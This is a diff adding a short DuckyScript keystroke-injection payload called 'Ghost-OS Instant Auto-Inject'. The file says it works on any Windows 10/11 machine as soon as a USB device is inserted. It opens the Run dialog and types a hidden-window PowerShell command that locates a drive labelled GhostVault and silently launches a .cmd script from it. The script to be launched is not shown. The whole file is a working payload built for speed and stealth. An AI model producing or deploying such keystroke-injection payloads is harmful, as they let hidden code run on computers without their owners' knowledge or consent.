@@ -1,0 +1,12 @@
+REM ==================================================================
+REM Ghost-OS Windows Instant Auto-Inject DuckyScript
+REM Target: Any Windows 10/11 Computer
+REM Triggers: Immediately upon USB physical insertion
+REM Speed: Under 500ms
+REM ==================================================================
+
+DELAY 400
+GUI r
+DELAY 250
+STRING powershell -WindowStyle Hidden -Command "$d=(Get-Volume -FileSystemLabel GhostVault).DriveLetter; if($d){Start-Process ($d+':\Launch-GhostOS.cmd')}"
+ENTER
